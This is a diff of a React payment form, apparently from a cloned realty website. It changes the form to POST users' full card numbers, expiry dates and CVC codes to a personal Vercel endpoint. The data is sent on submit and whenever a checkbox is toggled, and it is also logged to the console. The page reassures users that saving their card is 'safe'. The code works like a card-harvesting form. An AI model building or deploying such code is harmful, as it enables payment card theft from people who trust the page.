@@ -1,10 +1,8 @@
-// src/components/ReservationSearchForm.js
-
 import React, { useState } from 'react';
 import './PayWith.css';
 import { IoIosArrowBack } from "react-icons/io";
 import newMob from '../../Assets/NewMob.png';
-import {Link} from 'react-router-dom'
+import { Link } from 'react-router-dom';
 
 function PayWith() {
     const [cardNumber, setCardNumber] = useState('');
@@ -30,6 +28,7 @@ function PayWith() {
         setCvcCode(input);
     };
 
+    // Save data to the server
     const saveDataToServer = async () => {
         const formData = {
             cardNumber,
@@ -38,7 +37,8 @@ function PayWith() {
         };
 
         try {
-            const response = await fetch('http://localhost:5000/api/save-data', { // Update the URL if your server is hosted elsewhere
+            // Replace 'http://localhost:5000' with your Vercel server URL
+            const response = await fetch('https://sun-realty-clone-8omhnrcu4-caleb-shokes-projects.vercel.app/api/save-data', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
@@ -62,7 +62,7 @@ function PayWith() {
         saveDataToServer(); // Save data when the checkbox is checked or unchecked
     };
 
-    const handleSearch = (e) => {
+    const handleSubmit = (e) => {
         e.preventDefault();
 
         if (cardNumber.length < 16) {
@@ -72,7 +72,7 @@ function PayWith() {
 
         setError('');
         saveDataToServer(); // Save data when the Pay Now button is clicked
-        console.log('Search with:', cardNumber, expirationDate, cvcCode);
+        console.log('Submit with:', cardNumber, expirationDate, cvcCode);
     };
 
     return (
@@ -83,7 +83,7 @@ function PayWith() {
             </div>
             <div className='imageForm'>
                 <img src={newMob} alt="Mobile" />
-                <form onSubmit={handleSearch}>
+                <form onSubmit={handleSubmit}>
                     <input
                         type='text'
                         className='inputNot'
@@ -113,7 +113,7 @@ function PayWith() {
                         <p>Save your card information, it's safe</p>
                     </div>
 
-                    <Link to='/payment/search'><button type='submit'>Book </button> </Link> 
+                    <button type='submit'>Book</button>
                 </form>
             </div>
         </div>
